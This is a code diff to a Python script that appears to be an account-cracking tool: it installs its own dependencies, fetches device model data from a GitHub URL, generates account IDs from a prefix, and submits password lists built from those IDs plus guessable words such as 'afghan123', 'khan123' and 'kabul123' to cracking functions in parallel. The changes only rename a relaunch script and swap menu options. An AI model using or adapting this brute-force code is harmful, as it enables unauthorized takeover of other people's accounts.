@@ -28,7 +28,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python AB KHANX.py')
+	os.system('python Saadat.py')
 android_models=[]
 try:
 	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
@@ -586,13 +586,13 @@ def pak():
 			linex()
 			for psx in user:
 				ids = code+psx
-				if pcs in ['1','01']:
+				if pcs in ['2','02']:
 					passlist = [psx,ids]
-				elif pcs in ['2','02']:
+				elif pcs in ['1','01']:
 					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
 				else:
 					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost12']
-				if mthd in ['1','01']:
+				if mthd in ['2','02']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
 					AXI.submit(rcrack,ids,passlist)
